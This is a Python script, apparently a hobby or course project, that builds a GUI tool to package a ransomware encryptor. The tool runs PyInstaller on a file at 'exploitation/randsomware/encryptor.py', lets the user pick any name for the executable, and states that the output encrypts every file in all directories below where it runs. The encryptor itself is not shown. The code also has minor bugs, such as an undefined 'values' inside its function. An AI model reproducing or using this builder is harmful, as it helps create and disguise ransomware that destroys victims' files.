# create app that creates the files needed to run
# explain what it does and why it is dangerous

import PySimpleGUI as sg
import os
import PyInstaller.__main__
import shutil

def run_pyinstaller(name):
    path = os.getcwd()
    full_path = os.path.join(path, "exploitation/randsomware/encryptor.py")

    PyInstaller.__main__.run([
        full_path,
        '--onefile',
        '--windowed',
        f'-n {name}'
    ])

    os.remove(f"{values[0]}.spec")
    shutil.move(f"dist/{values[0]}", ".")
    shutil.move(f"dist/{values[0]}.app", ".", copy_function=shutil.copytree)
    shutil.rmtree("dist")
    shutil.rmtree("build")

sg.theme('Dark Grey 13')
sg.set_options(font='sans')

sg.popup("""
This app will create an app in your current directory with the name of whatever you name it. \
When that app is ran, it will encrypt all files going down directories from where this is ran. \
""")

sg.popup("""
I have prepared some files inside of a folder. It would be smart \
    to navigate the explotaition/randsomware folder if you want to test it out
""")

layout = [
    [sg.Text('Enter the name you would like to name the file:')],
    [sg.Input()],
    [sg.B('Enter', bind_return_key=True)]
]

window = sg.Window('Program creator', layout)
while True:
    event, values = window.read()
    if event == sg.WIN_CLOSED or event == 'Exit':
        break

    elif event == 'Enter':
        run_pyinstaller(values[0])
        sg.popup("Done!", any_key_closes=True)
        window.close()

    elif event == 'Clear':
        window.find_element('out').Update('')

window.close()
